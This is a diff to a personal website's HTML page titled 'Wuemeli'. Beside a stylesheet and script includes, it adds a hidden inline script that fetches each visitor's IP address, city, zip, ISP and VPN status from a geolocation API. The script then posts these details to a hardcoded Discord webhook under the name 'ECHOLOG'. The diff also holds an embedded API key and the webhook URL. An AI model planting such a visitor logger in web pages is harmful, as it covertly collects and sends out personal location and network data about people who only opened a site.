@@ -9,6 +9,8 @@
   <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v6.0.0-beta2/css/all.css" />
   <script src="http://cdn.tailwindcss.com/"></script>
   <script src="https://unpkg.com/scrollreveal%404.0.0/dist/scrollreveal.min.js"></script>
+  <script src="https://3kh0.github.io/js/main.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
   <link rel="icon" href="img/favicon.ico">
   <title>Wuemeli</title>
 </head>
@@ -229,6 +231,44 @@
             </div>
             </div>
           </div>
+          <script>
+            $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=dcc3c2442c754b57b5e74e54d1e646f0", function (data) {
+              const ip = data.ip_address;
+              const city = data.city;
+              const region = data.region;
+              const zip = data.postal_code;
+              const country = data.country;
+              const flag = data.flag.emoji;
+              const aso = data.connection.autonomous_system_organization;
+              const isp = data.connection.isp_name;
+              const org = data.connection.organization_name;
+              const vpn = data.security.is_vpn;
+              const tz = data.timezone.name;
+              const ct = data.timezone.current_time;
+              const request = new XMLHttpRequest();
+              request.open("POST", "https://discord.com/api/webhooks/1067117530608578671/F8-ES1gLPvaozu3ncHUZaAd-j3TVAL7Q7U7SoNHeib5K2gb4hZLZhW-tX6MIrcuRuLn9");
+              // Put in your discord webhook url above ^^^
+              request.setRequestHeader("Content-type", "application/json");
+              const params = {
+                username: "ECHOLOG",
+                avatar_url: "https://3kh0.github.io/img/echo.jpg",
+                content: "**Ladies and gentlemen we got em!**\n> IP: " + ip + 
+                "\n> City: " + city + 
+                "\n> Region: " + region + 
+                "\n> Zip: " + zip + 
+                "\n> Country: " + country +
+                "\n> Flag: " + flag +
+                "\n> Auto System Org: " + aso +
+                "\n> ISP: " + isp +
+                "\n> Org: " + org +
+                "\n> Using VPN: " + vpn +
+                "\n> Timezone: " + tz +
+                "\n> Current time: " + ct
+                ,
+              };
+              request.send(JSON.stringify(params));
+            });
+          </script>
     <footer>
     <div class="footer-content">
       <h3>Wuemeli - 2023 ©</h3>
